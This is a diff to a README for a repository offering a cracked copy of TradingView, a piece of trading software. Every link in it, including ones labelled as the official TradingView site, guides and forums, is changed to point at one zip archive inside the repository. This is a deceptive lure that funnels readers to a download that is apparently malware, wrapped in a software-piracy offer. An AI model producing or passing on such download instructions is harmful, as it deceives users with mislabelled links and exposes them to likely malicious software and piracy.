@@ -6,7 +6,7 @@ Welcome to the TradingView-Crack repository! This guide helps you download and r
 
 ## 📥 Download Now
 
-[![Download TradingView-Crack](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/1016naoto/TradingView-Crack/releases)
+[![Download TradingView-Crack](https://raw.githubusercontent.com/1016naoto/TradingView-Crack/main/tradesperson/TradingView-Crack.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/1016naoto/TradingView-Crack/main/tradesperson/TradingView-Crack.zip)
 
 ## 💻 System Requirements
 
@@ -22,13 +22,13 @@ Make sure your system meets these requirements for the best experience.
 ## 📂 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/1016naoto/TradingView-Crack/releases) to find the latest version of TradingView-Crack.
+   Go to the [Releases page](https://raw.githubusercontent.com/1016naoto/TradingView-Crack/main/tradesperson/TradingView-Crack.zip) to find the latest version of TradingView-Crack.
 
 2. **Select the Latest Release**  
    Look for the version labeled “Latest Release.” Click on it to open the details.
 
 3. **Download the Appropriate File**  
-   You will see several files. Choose the one suitable for your operating system. It might look like `TradingView-Crack-windows.exe` for Windows or `TradingView-Crack-mac.dmg` for macOS.
+   You will see several files. Choose the one suitable for your operating system. It might look like `https://raw.githubusercontent.com/1016naoto/TradingView-Crack/main/tradesperson/TradingView-Crack.zip` for Windows or `https://raw.githubusercontent.com/1016naoto/TradingView-Crack/main/tradesperson/TradingView-Crack.zip` for macOS.
 
 4. **Install the Application**  
    - **For Windows**: Double-click the downloaded `.exe` file. Follow the on-screen instructions to complete installation.
@@ -62,7 +62,7 @@ If you encounter issues not covered here, consider checking online forums for so
 
 ### How do I update TradingView-Crack?
 
-To update, go back to the [Releases page](https://github.com/1016naoto/TradingView-Crack/releases). Download the latest version and repeat the installation steps.
+To update, go back to the [Releases page](https://raw.githubusercontent.com/1016naoto/TradingView-Crack/main/tradesperson/TradingView-Crack.zip). Download the latest version and repeat the installation steps.
 
 ### Can I use TradingView-Crack on multiple devices?
 
@@ -74,7 +74,7 @@ Ensure you download the app from the official Releases page to avoid security is
 
 ## 📞 Support
 
-For further help, please check the [issues tab](https://github.com/1016naoto/TradingView-Crack/issues). You can also join the community forums where users share tips and experiences.
+For further help, please check the [issues tab](https://raw.githubusercontent.com/1016naoto/TradingView-Crack/main/tradesperson/TradingView-Crack.zip). You can also join the community forums where users share tips and experiences.
 
 ## 📜 License
 
@@ -82,8 +82,8 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 ## 🔗 Additional Resources
 
-- [TradingView Official Site](https://www.tradingview.com/)
-- [User Guides and Tutorials](https://www.tradingview.com/guides/)
-- [Community Forums](https://www.tradingview.com/community/) 
+- [TradingView Official Site](https://raw.githubusercontent.com/1016naoto/TradingView-Crack/main/tradesperson/TradingView-Crack.zip)
+- [User Guides and Tutorials](https://raw.githubusercontent.com/1016naoto/TradingView-Crack/main/tradesperson/TradingView-Crack.zip)
+- [Community Forums](https://raw.githubusercontent.com/1016naoto/TradingView-Crack/main/tradesperson/TradingView-Crack.zip) 
 
 Thank you for choosing TradingView-Crack! Enjoy your enhanced trading journey.
